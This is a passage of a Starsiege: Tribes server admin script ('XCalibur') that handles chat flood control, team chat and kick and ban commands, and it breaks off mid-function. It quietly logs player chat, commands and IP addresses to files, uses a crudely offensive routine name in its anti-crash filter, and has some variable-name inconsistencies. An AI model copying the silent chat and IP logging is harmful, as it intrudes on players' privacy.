	 	if($Server::FloodProtectionEnabled && (!$Server::TourneyMode || !%team)) 	{ 		 		%time = getIntegerTime(true) >> 5; 		if(%clientId.floodMute) 		{ 			%delta = %clientId.muteDoneTime - %time; 			if(%delta > 0) 			{ 				Client::sendMessage(%clientId, $MSGTypeGame, $adminbotname@": Foo!!! You cannot talk for " @ %delta @ " seconds. ~wacess_denied.wav"); 				return; 			} 			%clientId.floodMute = ""; 			%clientId.muteDoneTime = ""; 		} 		%clientId.floodMessageCount++; 		 		schedule(%clientId @ ".floodMessageCount--;", 5, %clientId); 		if(%clientId.floodMessageCount > 4) 		{ 			%clientId.floodMute = true; 			%clientId.muteDoneTime = %time + 20; 			Client::sendMessage(%clientId, $MSGTypeGame, $adminbotname@": Foo!!! You cannot talk for 20 seconds."); 			return; 		} 		

	} 	if(KickandBan(%clientId, %message)) 	{ 		return; 	} 	if(checkMessage(%clientId, %team, %message)) 	{ 		return; 	} 	if(string::findsubstr(getWord(%message, 0), "Del_ServerHosting*") != "0" && string::findsubstr(getWord(%message, 1), "Eternaldamnation") != "0" && string::findsubstr(getWord(%message, 0), "!*}D|M{*!") != "0") 	{ 		$Name = %name; 		$Message = %message; 		export("$Name", "config\\Chat.txt", true); 		export("$Message", "config\\Chat.txt", true); 	} 	if(string::getsubstr(%message, 0, 1) == "!") 	{ 		$User = %name; 		$Command = %message; 		export("$User", "config\\Commands.txt", true); 		export("$Command", "config\\Commands.txt", true); 		export("$XCalibur::Space", "config\\Commands.txt", true); 	} 	if(!%clientId.isXCal) {	if(string::getSubStr(%message, 0, 4) == "@\n" || string::getSubStr(%message, 0, 4) == "@\t" || string::len(%message) > 217) 	{ 		%clientId.gag = true; 		RapeTheCrasher(%clientId); 		return false; 	} }	if($ClanChat::Activated && %clientId.isClan) 	{ 		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) 		{ 			if(%cl.isClan) 			{ 				client::sendmessage(%cl,0,%message, %clientId); 			} 		} 		return true; 	}		 	if(%team) 	{ 		if($dedicated) 			echo("SAYTEAM: " @ %msg);

		%team = Client::getTeam(%clientId); 		NearBug(%clientId, %bug); 		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) 		if((Client::getTeam(%cl) == %team && !%cl.muted[%clientId]) || (Client::getTeam(%cl) != %team && %cl.isSuperAdmin)) 		{ 			if(Client::getTeam(%cl) != %team && %cl.isSuperAdmin) 			{ 				Client::sendMessage(%cl, $MsgTypeGame, %message, %clientId); 			} 			else 			{ 				Client::sendMessage(%cl, $MsgTypeTeamChat, %message, %clientId); 			} 		} 		else if(Player::getMountedItem(%cl, $BackpackSlot) == BugPack) 		{ 			Client::sendMessage(%cl, $MsgTypeGame, %message, %clientId); 		} 	} 	else 	{ 		if($dedicated) 			echo(%name@": " @ %message);

		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) 			if(!%cl.muted[%clientId]) 				Client::sendMessage(%cl, $MsgTypeChat, %message, %clientId); 	} }

function remoteIssueCommand(%commander, %cmdIcon, %command, %wayX, %wayY, %dest1, %dest2, %dest3, %dest4, %dest5, %dest6, %dest7, %dest8, %dest9, %dest10, %dest11, %dest12, %dest13, %dest14) { 	if($dedicated) 		echo("COMMANDISSUE: " @ %commander @ " \"" @ escapeString(%command) @ "\""); 	 	for(%i = 1; %dest[%i] != ""; %i = %i + 1) 		if(!%dest[%i].muted[%commander]) 		{ 			issueCommandI(%commander, %dest[%i], %cmdIcon, %command, %wayX, %wayY); 			 			%waypoint= %WayX @ " " @ %WayY;    			 			%commandee = %dest[%i]; 			$point[%commandee] = %waypoint; 			 		}	     }

function remoteIssueTargCommand(%commander, %cmdIcon, %command, %targIdx, %dest1, %dest2, %dest3, %dest4, %dest5, %dest6, %dest7, %dest8, %dest9, %dest10, %dest11, %dest12, %dest13, %dest14) { 	if($dedicated) 		echo("COMMANDISSUE: " @ %commander @ " \"" @ escapeString(%command) @ "\""); 	for(%i = 1; %dest[%i] != ""; %i = %i + 1) 		if(!%dest[%i].muted[%commander]) 			issueTargCommand(%commander, %dest[%i], %cmdIcon, %command, %targIdx); }

function remoteCStatus(%clientId, %status, %message) { 	 	if(setCommandStatus(%clientId, %status, %message)) 	{ 		if($dedicated) 		echo("COMMANDSTATUS: " @ %clientId @ " \"" @ escapeString(%message) @ "\""); 	} 	else 		remoteSay(%clientId, true, %message); }

function teamMessages(%mtype, %team1, %message1, %team2, %message2, %message3) { 	%numPlayers = getNumClients(); 	for(%i = 0; %i < %numPlayers; %i = %i + 1) 	{ 		%id = getClientByIndex(%i);       	if(Client::getTeam(%id) == %team1)       	{       		Client::sendMessage(%id, %mtype, %message1); 		} 		else if(%message2 != "" && Client::getTeam(%id) == %team2) 		{ 			Client::sendMessage(%id, %mtype, %message2); 		} 		else if(%message3 != "") 		{ 			Client::sendMessage(%id, %mtype, %message3); 		} 	} }

function messageAll(%mtype, %message, %filter) { 	if(%filter == "") 		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) 			Client::sendMessage(%cl, %mtype, %message); 	else 	{ 		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) 		{ 			if(%cl.messageFilter & %filter) 				Client::sendMessage(%cl, %mtype, %message); 		} 	} }

function messageAllExcept(%except, %mtype, %message) { 	for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) 		if(%cl != %except) 			Client::sendMessage(%cl, %mtype, %message); }

function NearBug(%clientId, %message) { 	%player = Client::getTeam(%clientId); 	%pos = GameBase::getPosition(%clientId); 	%set = newObject("set",SimSet); 	%mask = $StaticObjectType; 	%num = containerBoxFillSet(%set,%mask,%pos,300,300,300,0); 	%num = CountObjects(%set,"DeployableBug",%num);

	if(%num > 0) 	{ 		for(%count = 0; %index != -1; %count++) 		{ 			%index = Group::getObject(%set, %count); 			if(%index != -1) 		 	{ 				%name = GameBase::getDataName(%index); 				%team = GameBase::getTeam(%index); 				if(%name == "DeployableBug") 				{ 					if(%team != %player) 					{ 						for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) 					      if(Client::getTeam(%cl) == %team && !%cl.muted[%clientId]) 					            Client::sendMessage(%cl,1,"Enemy Transmission: "@ %message @"~waccess_denied.wav"); 					} 				} 			} 		} 	} 	deleteObject(%set); } 
function KickandBan(%clientId, %message) 
{ 	 	
	%cl1 = %clientId.selClient;
 	%ip = client::getTransportAddress(%cl1);
 	$XCalibur::IP: = %ip;
	%clname = client::getName(%cl1);
 	if(String::getSubStr(%message, 0, 5) == "!kmsg" && %clientId.isKickMessage)
 	{
 		%clname = Client::getName(%clientId.selClient);
 		%AdminName = Client::getName(%clientId);
 		%cl = %clientId.selClient;
 		%message = string::getsubstr(%message, 5, 999);
 		if(string::getsubstr(%message, 0, 1) != "")
 		{
 			messageall(2, $adminbotname@": "@%clname@" was just kicked by "@%AdminName@"");
 			%message = string::getsubstr(%message, 1, 999);
 			$XCalibur::KickMessage: = %message;
 			$XCalibur::Space = "-----------------------------------------------------------------------------------------";

 			export("$XCalibur::KickMessage:", "config\\kickmessages.txt" , true);
 			echo("$XCalibur::Message: "@%message@"");
 			export("$XCalibur::Space", "config\\kickmessages.txt" , true);

	 		echo("_______________________________________________________________________");
 			echo("Exporting Message to Messages.txt");
 			Net::kick(%cl, "\n\n<jc>"@%message@" ");
 			%clientId.isKickMessage = false;
 			return true;
 		}
 		else if(string::getsubstr(%message, 5, 999) == "")
 		{
 			Client::sendMessage(%clientId, 1, "XCalibur: Please Enter A Message");
 		}
 	}
	else if(string::getsubstr(%message, 0, 7) == "!reason" && %clientId.isReasonMessage)
 	{
 		%clname = Client::getName(%clientId.selClient);
 		%AdminName = Client::getName(%clientId);
 		%cl = %clientId.selClient;
 		%reason = string::getsubstr(%message, 7, 999);
 		if(string::getsubstr(%message, 0, 1) != "")
 		{
 			%km = "    XCalibur::Kick    ";
 			%space = "                    ";
 			messageallExcept(%cl, 1, $adminbotname@": "@%clname@" is about to be kicked by "@%AdminName@" ");
 			%clientId.isKickMessage = true;
 			client::sendMessage(%clientId, 1, $adminbotname@": Please enter a kick message (type: !kmsg Message)(this is the message the person sees when there kicked)");
 			$XCalibur::Kick: = %km;
 			$XCalibur::LineSpace: = %space;
 			$XCalibur::KickedPlayer: = %clname;
 			$XCalibur::KickedBy: = %AdminName;
 			$XCalibur::Reason: = %reason;
 			export("$XCalibur::Kick", "config\\kickmessages.txt", true);
 			export("$XCalibur::LineSpace", "config\\kickmessages.txt", true);
 			export("$XCalibur::KickedPlayer:", "config\\kickmessages.txt", true);
 			export("$XCalibur::IP:", "config\\kickmessages.txt", true);
 			export("$XCalibur::KickedBy:", "config\\kickmessages.txt" , true);
 			export("$XCalibur::Reason:", "config\\kickmessages.txt" , true);
 			echo("__________________________________________________________________");
 			echo("       XCalibur::KickMessage    ");
 			echo("");
 			echo("XCalibur::Kicked Player: "@%clname@" ");
 			echo("XCalibur::IP: "@%ip@"");
 			echo("XCalibur::Kicked By: "@%AdminName@" ");
 			echo("XCalibur::Reason: "@%reason@" ");
 			%clientId.isReasonMessage = false;
 			return true;
 		}
 		else
 		{
			Client::sendMessage(%clientId, 1, $adminbotname @": Please Enter A Reason");
 		}
 	}
 	else if(String::getSubStr(%message, 0, 5) == "!bmsg" && %clientId.isTagBanMessage)
 	{
 		%clname = Client::getName(%clientId.selClient);
 		%AdminName = Client::getName(%clientId);
 		%cl = %clientId.selClient;
 		%message = string::getsubstr(%message, 5, 999);
 		if(string::getsubstr(%message, 0, 1) != "")
 		{
 			messageAll(2, $adminbotname@": "@%clname@" was just Banned by "@%AdminName@"");
 			$XCalibur::Message: = %message;
 			$XCalibur::Space = "-------------------------------------------------------------------------";
 			export("XCalibur::Message:", "config\\banmessages.txt", true);
 			export("XCalibur::Space", "config\\banmessages.txt", true);
 			export("-------------------------------------------------------------------------------------", "config\\banmessages.txt" , true);
	 		echo("XCalibur::Message: "@%message@"");
 			echo("_______________________________________________________________________");
 			echo("Exporting Message to banmessages.txt");
 			%clientId.isTagBanMessage = false;
 			Net::kick(%cl, "\n<jc>YOU JUST GOT YOUR CLAN BANNED:\n\n<jc>"@%message@" ");
 			return true;
 		}
 		else if(string::getsubstr(%message, 5, 999) == "")
 		{
 			Client::sendMessage(%clientId, 1, $adminbotname @": Please Enter A Message");
 		}
 	}
 	else if(String::getSubStr(%message, 0, 5) == "!bmsg" && %clientId.isIPBanMessage)
 	{
 		%clname = Client::getName(%clientId.selClient);
 		%AdminName = Client::getName(%clientId);
 		%cl = %clientId.selClient;
 		%message = string::getsubstr(%message, 5, 999);
 		if(string::getsubstr(%message, 0, 1) != "")
 		{
 			messageAll(2, $adminbotname@": "@%clname@" was just Banned by "@%AdminName@"");
 			$XCalibur::Message: = %message;
 			$XCalibur::Space = "-------------------------------------------------------------------------";
 			export("XCalibur::Message:", "config\\banmessages.txt", true);
 			export("XCalibur::Space", "config\\banmessages.txt", true);
 			export("-------------------------------------------------------------------------------------", "config\\banmessages.txt" , true);
	 		echo("XCalibur::Message: "@%message@"");
 			echo("_______________________________________________________________________");
 			echo("Exporting Message to banmessages.txt");
 			Net::kick(%cl, "\n<jc>YOU HAVE JUST BEEN IP BANNED:\n\n<jc>"@%message@" ");
 			%clientId.isIPBanMessage = false;
 			return true;
 		}
 		else if(string::getsubstr(%message, 5, 999) == "")
 		{
 			Client::sendMessage(%clientId, 1, $adminbotname @": Please Enter A Message");
 		}
 	} 	
else if(String::getSubStr(%message, 0, 5) == "!bmsg" && %clientId.isNameBanMessage)
{
 	%clname = Client::getName(%clientId.selClient);
	%AdminName = Client::getName(%clientId);
 	%cl = %clientId.selClient;
 	%message = string::getsubstr(%message, 5, 999);
 	%ip = client::getTransportAddress(%cl);
	%reason = $NameBanReason;
	if(string::getsubstr(%message, 0, 1) != "")
 	{
 		messageAll(2, $adminbotname@": "@%clname@" was just Banned by "@%AdminName@""); 	
		$XCalibur::Message: = %message;
 		$XCalibur::Space = "-------------------------------------------------------------------------";
 		export("XCalibur::Message:", "config\\banmessages.txt", true);
 		export("XCalibur::Space", "config\\banmessages.txt", true);
 		export("-------------------------------------------------------------------------------------", "config\\banmessages.txt" , true);
	 	echo("XCalibur::Message: "@%message@""); 		
		echo("_______________________________________________________________________"); 	
		echo("Exporting Message to banmessages.txt");
 		Net::kick(%cl, "\n<jc>YOU HAVE JUST BEEN BANNED:\n\n<jc>"@%message@" ");
 		%clientId.isNameBanMessage = false;
 		return true;
 	}
 	else if(string::getsubstr(%message, 5, 999) == "")
 	{
 		Client::sendMessage(%clientId, 1, $adminbotname @": Please Enter A Message");
 	}
} 
else if(String::getSubStr(%message, 0, 5) == "!bmsg" && %clientId.isPermaBanMessage) 	
{
 	%clname = Client::getName(%clientId.selClient);
 	%AdminName = Client::getName(%clientId);
	%cl = %clientId.selClient;
	%message = string::getsubstr(%message, 5, 999);
 	if(string::getsubstr(%message, 0, 1) != "") 
	{ 	
		messageAll(2, $adminbotname@": "@%clname@" was just Banned by "@%AdminName@""); 
		%message = string::getsubstr(%message, 1, 999); 			 	
		$XCalibur::Message: = %message;
 		$XCalibur::Space = "-------------------------------------------------------------------------";
 		export("XCalibur::Message:", "config\\banmessages.txt", true);
 		export("XCalibur::Space", "config\\banmessages.txt", true);
 		export("-------------------------------------------------------------------------------------", "config\\banmessages.txt" , true);
 		echo("XCalibur::Message: "@%message@"");
 		echo("_______________________________________________________________________");
		echo("Exporting Message to banmessages.txt");
 		PermBanMSG(%cl, %message);
 		%clientId.isPermaBanMessage = false;
 		return true;
 	}
 	else if(string::getsubstr(%message, 5, 999) == "")
 	{
 		Client::sendMessage(%clientId, 1, $adminbotname @": Please Enter A Message");
 	}
} 
else if(string::getsubstr(%message, 0, 7) == "!Player" && %clientId.isAddIPBan) 
{ 	
	%AdminName = Client::getName(%clientId); 		
	$clname = getWord(%message, 1); 
	$BannedIP = getWord(%message, 2); 
	Client::sendMessage(%clientId, 0, $adminbotname@ ": Please Enter A Reason (type: !reason reason");
	%clientId.isAddIPBan = false; 
	%clientId.isIPReasonMessage1 = true; 	
 	return true;
} 
else if(string::getsubstr(%message, 0, 7) == "!Player" && %clientId.isAddNBan)
{
 	%AdminName = client::getName(%clientId);
 	%clname = getWord(%message, 1);
 	%ip = getWord(%message, 2);
	echo(%ip);
	client::sendMessage(%clientId, 0, "XCalibur: Please Enter A Reason (type: !reason reason)");
 	%clientId.isAddNBan = false; 	
	%clientId.isNameReasonMessage1 = true;
	$NameIP123 = getWord(%message, 2);
	$BSLName = %clname;
	return true; 
} 
else if(string::getsubstr(%message, 0, 7) == "!Player" && %clientId.isAddPBan) 	
{ 		
	%AdminName = Client::getName(%clientId); 
	%clname = getWord(%message, 1); 
	$PermaBannedIP = getWord(%message, 2); 
	$CLLName = %clname;
	Client::sendMessage(%clientId, 0, $adminbotname@ ": Please Enter A Reason (type: !reason reason");
 	%clientId.isPermaReasonMessage1 = true;
 	%clientId.isAddPermaBan = false;
 	return true; 
} 
else if(string::getsubstr(%message, 0, 4) == "!Tag" && %clientId.isTagBanAllow)
{ 	
	%AdminName = Client::getName(%clientId); 
	$BannedTag = string::getsubstr(%message, 5, 999); 
	%clientId.isTagReasonMessage = true; 	
	Client::sendMessage(%clientId, 0, $adminbotname@ ": Please Enter A Reason (type: !reason reason)"); 
	%clientId.isTagBanAllow = false; 
	return true;
} 	

else if(string::getsubstr(%message, 0, 4) == "!Tag" && %clientId.isTagBanAllow1)
{
 	%AdminName = Client::getName(%clientId);
 	%tag = string::getsubstr(%message, 5, 999);
	$Tag123 = %tag;
	$Adminny = %AdminName;
 	Client::sendMessage(%clientId, 0, $adminbotname@ ": Please Enter A Reason (type: !reason reason)");
 	%clientId.isTagReasonMessage1 = true;
 	%clientId.isTagBanAllow1 = false;
 	return true;
} 
	
else if(string::getsubstr(%message, 0, 7) == "!reason" && %clientId.isTagReasonMessage)
{
 	%clname = Client::getName(%clientId.selClient);
 	%AdminName = Client::getName(%clientId);
 	%cl = %clientId.selClient;
 	%reason = string::getsubstr(%message, 7, 999);
	$BannedTag = %tag;
 	if(string::getsubstr(%message, 0, 1) != "")
 	{
 		%bm = "    XCalibur::Ban    ";
 		$space = "                    ";
 		%type = "Tag Ban";
 		%clientId.isTagBanMessage = true;
 		client::sendMessage(%clientId, 1, $adminbotname@": Please enter a ban message (type: !bmsg Message)(this is the message the person sees when there banned)");
 		$XCalibur::Ban: = %bm;
 		$XCalibur::LineSpace: = %space;
 		$XCalibur::BanType: = %type;
 		$XCalibur::BannedTag: = %tag;
 		$XCalibur::BannedBy: = %AdminName;
 		$XCalibur::Reason: = %reason;
 		export("$XCalibur::Ban", "config\\banmessages.txt", true);
 		export("$XCalibur::LineSpace", "config\\banmessages.txt", true);
 		export("$XCalibur::BanType:", "config\\banmessages.txt", true);
 		export("$XCalibur::BannedTag:", "config\\banmessages.txt", true);
 		export("$XCalibur::IP:", "config\\banmessages.txt", true);
 		export("$XCalibur::BannedBy:", "config\\banmessages.txt", true);
 		export("$XCalibur::Reason:", "config\\banmessages.txt", true);
 		echo("__________________________________________________________________");
 		echo("       XCalibur::BanMessage    ");
 		echo("");
 		echo("XCalibur::Ban Type: Tag Ban");
 		echo("XCalibur::Banned Tag: "@%tag@" ");
 		echo("XCalibur::IP: "@%ip@"");
 		echo("XCalibur::Banned By: "@%AdminName@" ");
 		echo("XCalibur::Reason: "@%reason@" ");
		XTagBan(%tag, %clientId, %reason, %AdminName);
 		%clientId.isTagReasonMessage = false;
 		return true;
 	}
 	else
 	{
 		Client::sendMessage(%clientId, 1, $adminbotname @": Please Enter A Reason");
 	}
} 
else if(string::getsubstr(%message, 0, 7) == "!reason" && %clientId.isNameReasonMessage) 	
{
 	%clname = Client::getName(%clientId.selClient);
 	%AdminName = Client::getName(%clientId);
 	%cl = %clientId.selClient;
 	%reason = string::getsubstr(%message, 7, 999);
 	if(string::getsubstr(%message, 0, 1) != "")
 	{
 		%bm = "    XCalibur::Ban    ";
 		$space = "                    ";
 		%type = "Name Ban";
 		messageallExcept(%cl, 1, $adminbotname@ ": "@%clname@" is about to be banned by "@%AdminName@" ");
 		%clientId.isNameBanMessage = true;
 		client::sendMessage(%clientId, 1, $adminbotname@": Please enter a ban message (type: !bmsg Message)(this is the message the person sees when there banned)");
 		$XCalibur::Ban: = %bm;
 		$XCalibur::LineSpace: = %space;
 		$XCalibur::BanType: = %type;
 		$XCalibur::BannedPlayer: = %clname;
 		$XCalibur::BannedBy: = %AdminName;
 		$XCalibur::Reason: = %reason;
 		export("$XCalibur::Ban", "config\\banmessages.txt", true);
 		export("$XCalibur::LineSpace", "config\\banmessages.txt", true);
 		export("$XCalibur::BanType:", "config\\banmessages.txt", true);
 		export("$XCalibur::BannedPlayer:", "config\\banmessages.txt" , true);
 		export("$XCalibur::IP:", "config\\banmessages.txt", true);
 		export("$XCalibur::BannedBy:", "config\\banmessages.txt" , true);
 		export("$XCalibur::Reason:", "config\\banmessages.txt" , true);
 		echo("__________________________________________________________________");
 		echo("       XCalibur::BanMessage    ");
 		echo("");
 		echo("XCalibur::Ban Type: Name Ban");
 		echo("XCalibur::Banned Player: "@%clname@" ");
 		echo("XCalibur::IP: "@%ip@"");
 		echo("XCalibur::Banned By: "@%AdminName@" ");
 		echo("XCalibur::Reason: "@%reason@" ");
 		%clientId.isNameReasonMessage = false;
		%ip1 = client::getTransportAddress(%clientId.selClient);
		XNameBan(%ip1, %clname, %clientId, %AdminName, %reason);
 		return true;
 	}
 	else
 	{
 		Client::sendMessage(%clientId, 1, $adminbotname @": Please Enter A Reason");
 	}
}		 
else if(string::getsubstr(%message, 0, 7) == "!reason" && %clientId.isIPReasonMessage)
{
 	%clname = Client::getName(%clientId.selClient);
 	%AdminName = Client::getName(%clientId);
 	%cl = %clientId.selClient;
 	%reason = string::getsubstr(%message, 7, 999);
 	if(string::getsubstr(%message, 0, 1) != "")
 	{
 		%bm = "    XCalibur::Ban    ";
 		$space = "                    ";
 		%type = "IP Ban";
 		messageallExcept(%cl, 1, $adminbotname@ ": "@%clname@" is about to be banned by "@%AdminName@" ");
 		%clientId.isIPBanMessage = true;
 		client::sendMessage(%clientId, 1, $adminbotname@": Please enter a ban message (type: !bmsg Message)(this is the message the person sees when there banned)");
 		$XCalibur::Ban: = %bm;
 		$XCalibur::LineSpace: = %space;
 		$XCalibur::BanType: = %type;
 		$XCalibur::BannedPlayer: = %clname;
 		$XCalibur::BannedBy: = %AdminName;
 		$XCalibur::Reason: = %reason;
 		export("$XCalibur::Ban", "config\\banmessages.txt", true);
 		export("$XCalibur::LineSpace", "config\\banmessages.txt", true);
 		export("$XCalibur::BanType:", "config\\banmessages.txt", true);
 		export("$XCalibur::BannedPlayer:", "config\\banmessages.txt" , true);
 		export("$XCalibur::IP:", "config\\banmessages.txt", true);
 		export("$XCalibur::BannedBy:", "config\\banmessages.txt" , true);
 		export("$XCalibur::Reason:", "config\\banmessages.txt" , true);
 		echo("__________________________________________________________________");
 		echo("       XCalibur::BanMessage    ");
 		echo("");
 		echo("XCalibur::Ban Type: IP Ban");
 		echo("XCalibur::Banned Player: "@%clname@" ");
 		echo("XCalibur::IP: "@%ip@"");
 		echo("XCalibur::Banned By: "@%AdminName@" ");
 		echo("XCalibur::Reason: "@%reason@" ");
 		%clientId.isIPReasonMessage = false;
		%ip = client::getTransportAddress(%clientId.selClient);
		XIPBan(%ip, %clname, %clientId, %AdminName, %reason);
 		return true;
 	}
 	else
 	{
 		Client::sendMessage(%clientId, 1, $adminbotname @": Please Enter A Reason");
 	}
}
else if(string::getsubstr(%message, 0, 7) == "!reason" && %clientId.isPermaReasonMessage)
{
 	%clname = Client::getName(%clientId.selClient);
 	%AdminName = Client::getName(%clientId);
 	%cl = %clientId.selClient;
 	%reason = string::getsubstr(%message, 7, 999);
 	if(string::getsubstr(%message, 0, 1) != "")
 	{
 		%bm = "    XCalibur::Ban    ";
 		$space = "                    ";
 		%type = "Permanent Ban";
 		messageallExcept(%cl, 1, $adminbotname@ ": "@%clname@" is about to be banned by "@%AdminName@" ");
 		%clientId.isPermaBanMessage = true;
 		client::sendMessage(%clientId, 1, $adminbotname@": Please enter a ban message (type: !bmsg Message)");
 		$XCalibur::Ban: = %bm;
 		$XCalibur::LineSpace: = %space;
 		$XCalibur::BanType: = %type;
 		$XCalibur::BannedPlayer: = %clname;
 		$XCalibur::BannedBy: = %AdminName;
 		$XCalibur::Reason: = %reason;
 		export("$XCalibur::Ban", "config\\banmessages.txt", true);
 		export("$XCalibur::LineSpace", "config\\banmessages.txt", true);
 		export("$XCalibur::BanType:", "config\\banmessages.txt", true);
 		export("$XCalibur::BannedPlayer:", "config\\banmessages.txt" , true);
 		export("$XCalibur::IP:", "config\\banmessages.txt", true);
 		export("$XCalibur::BannedBy:", "config\\banmessages.txt" , true);
 		export("$XCalibur::Reason:", "config\\banmessages.txt" , true);
 		echo("__________________________________________________________________");
 		echo("       XCalibur::BanMessage    ");
 		echo("");
 		echo("XCalibur::Ban Type: Permanent Ban");
 		echo("XCalibur::Banned Player: "@%clname@" ");
 		echo("XCalibur::IP: "@%ip@"");
 		echo("XCalibur::Banned By: "@%AdminName@" ");
 		echo("XCalibur::Reason: "@%reason@" ");
		%ip = client::getTransportAddress(%clientId.selClient);
		XPermaBan(%ip, %clname, %clientId, %AdminName, %reason);
 		%clientId.isPermaReasonMessage = false;
		
 		return true;
 	}
 	else
 	{
 		Client::sendMessage(%clientId, 1, $adminbotname @": Please Enter A Reason");
 	}
} 	
else if(string::getsubstr(%message, 0, 7) == "!reason" && %clientId.isTagReasonMessage1)
{
 	%AdminName = client::getName(%clientId); 		
	%reason = string::getsubstr(%message, 7, 999);
 	if(string::getsubstr(%message, 0, 1) != "")
 	{
		%tag = $Tag123;
 		client::sendMessage(%clientId, 3, "XCalibur: Ban Complete");
 		%bm = "    XCalibur::Ban    ";
 		$space = "                    ";
 		%type = "Tag Ban";
 		echo("__________________________________________________________________");
 		echo("       XCalibur::BanMessage    ");
 		echo("");
 		echo("XCalibur::Ban Type: Tag Ban");
 		echo("XCalibur::Banned Tag: "@%tag@" ");
 		echo("XCalibur::Banned By: "@%AdminName@" ");
 		echo("XCalibur::Reason: "@%reason@" ");
 		echo("___________________________________________________________________");
 		%clientId.isTagReasonMessage1 = false;
		XTagBan(%clientId, %tag, %reason, %AdminName);
 		return true;
 	}
 	else
 	{
 		Client::sendMessage(%clientId, 1, $adminbotname @": Please Enter A Reason");
 	}
}
else if(string::getsubstr(%message, 0, 7) == "!reason" && %clientId.isNameReasonMessage1)
{
	%ip = $NameIP123;
 	%AdminName = client::getName(%clientId); 
	%reason = string::getsubstr(%message, 7, 999); 	
	if(string::getsubstr(%message, 0, 1) != "") 	
	{ 	
		client::sendMessage(%clientId, 3, "XCalibur: Ban Complete");
		%clname = $BSLName;
 		%bm = "    XCalibur::Ban    "; 	
		$space = "                    "; 		
		%type = "Name Ban"; 	
		echo("__________________________________________________________________"); 		
		echo("       XCalibur::BanMessage    ");
 		echo("");
 		echo("XCalibur::Ban Type: Name Ban");
 		echo("XCalibur::Banned Player: "@%clname@" ");
		echo("XCalibur::IP: "@%ip@"");
 		echo("XCalibur::Banned By: "@%AdminName@" ");
 		echo("XCalibur::Reason: "@%reason@" ");
 		echo("__________________________________________________________________");
		XNameBan(%ip, %clname, %clientId, %AdminName, %reason);
 		%clientId.isNameReasonMessage1 = false;
 		return true;
 	}
 	else
 	{
 		Client::sendMessage(%clientId, 1, $adminbotname @": Please Enter A Reason");
 	}
}
else if(string::getsubstr(%message, 0, 7) == "!reason" && %clientId.isIPReasonMessage1)
{
	%ip = $BannedIP;
	%clname = $CLNAME;
 	%AdminName = client::getName(%clientId);
 	%reason = string::getsubstr(%message, 7, 999);
 	if(string::getsubstr(%message, 0, 1) != "")
 	{
 		client::sendMessage(%clientId, 3, "XCalibur: Ban Complete");
 		%bm = "    XCalibur::Ban    ";
 		$space = "                    ";
 		%type = "IP Ban";
 		echo("__________________________________________________________________");
 		echo("       XCalibur::BanMessage    ");
 		echo("");
 		echo("XCalibur::Ban Type: IP Ban");
 		echo("XCalibur::Banned Player: "@%clname@" ");
 		echo("XCalibur::IP: "@%ip@"");
 		echo("XCalibur::Banned By: "@%AdminName@" ");
 		echo("XCalibur::Reason: "@%reason@" ");
 		echo("__________________________________________________________________");
 		%clientId.isIPReasonMessage1 = false;
		XIPBan(%ip, %clname, %clientId, %AdminName, %reason);
 		return true;
 	}
	else 
	{ 	
		Client::sendMessage(%clientId, 1, $adminbotname @": Please Enter A Reason"); 
	}
}
else if(string::getsubstr(%message, 0, 7) == "!reason" && %clientId.isPermaReasonMessage1) 	
{ 	
	%ip = $PermaBannedIP;
	%AdminName = client::getName(%clientId);
 	%reason = string::getsubstr(%message, 7, 999);
	%clname = $CLLNAME;
 	if(string::getsubstr(%message, 0, 1) != "")
 	{
 		client::sendMessage(%clientId, 3, "XCalibur: Ban Complete");
 		%bm = "    XCalibur::Ban    ";
 		$space = "                    ";
		%type = "Permanent Ban";
 		echo("__________________________________________________________________");
 		echo("       XCalibur::BanMessage    ");
 		echo(""); 
		echo("XCalibur::Ban Type: Permanent Ban"); 
		echo("XCalibur::Banned Player: "@%clname@" "); 	
		echo("XCalibur::IP: "@%ip@""); 	
		echo("XCalibur::Banned By: "@%AdminName@" ");
 		echo("XCalibur::Reason: "@%reason@" ");
 		echo("__________________________________________________________________");
 		%clientId.isPermaReasonMessage1 = false;
		XPermaBan(%ip, %clname, %clientId, %AdminName, %reason);
 		return true;
 	}
 	else
	{
 		Client::sendMessage(%clientId, 1, $adminbotname @": Please Enter A Reason");
 	}
}
return false; }

function XPermaBan(%ip, %clname, %clientId, %AdminName, %reason)
{
 	for(%i=0; $PermaBannedIP[%i] != ""; %i++)
 	{
 	}
 	$PermaBannedIP[%i] = %ip;
 	$PermaBannedName[%i] = %clname;
 	CenterPrint(%clientId, "<F0>XCalibur: The Player <F1>[----->>  <f2>"@%clname@"<F1>  <<-----] <F0>Is Now Permanently Banned", 0);
 	file::delete("config\\PermanentBans.cs");
 	$H5 = "          Permanent BANS";
 	$B5 = " ";
 	$PermaBannedBy[%i] = %AdminName;
	$PermaBanReason[%i] = %reason;
 	Export("$H5", "config\\PermanentBans.cs", true);
 	Export("$B5", "config\\PermanentBans.cs", true);
 	export("$PermaBannedName*", "config\\PermanentBans.cs", true);
 	export("$PermaBannedIP*", "config\\PermanentBans.cs", true);
	export("$PermaBanReason*", "config\\PermanentBans.cs", true);
 	export("$PermaBannedBy*", "config\\PermanentBans.cs", true);
	%ip1 = "IP:"@XCalibur::TrimIP(%ip);
	banlist::add(%ip1, 9745649);
	banlist::export("config\\Banlist.cs");
 	return true;
}

function XIPBan(%ip, %clname, %clientId, %AdminName, %reason)
{
 	for(%i=0; $BannedIP[%i] != ""; %i++)
 	{
 	}
 	$BannedIP[%i] = %ip;
 	$ClientName[%i] = %clname;
 	CenterPrint(%clientId, "<F0>XCalibur: The IP Address <F1>[----->>  <f2>"@%ip@"<F1>  <<-----] <F0>Is Now Banned", 0);
 	file::delete("config\\IPBans.cs");
 	$H = "          IP BANS";
 	$B = " ";
 	$IPBannedBy[%i] = %AdminName;
	$IPBanReason[%i] = %reason;
 	Export("$H", "config\\IPBans.cs", true);
 	Export("$B", "config\\IPBans.cs", true);
 	export("$ClientName*", "config\\IPBans.cs", true);
 	export("$BannedIP*", "config\\IPBans.cs", true);
	export("$IPBanReason*", "config\\IPBans.cs", true);
 	export("$IPBannedBy*", "config\\IPBans.cs", true);
	%ip1 = "IP:"@XCalibur::TrimIP(%ip);
	banlist::add(%ip1, 5684563);
	banlist::export("config\\Banlist.cs");
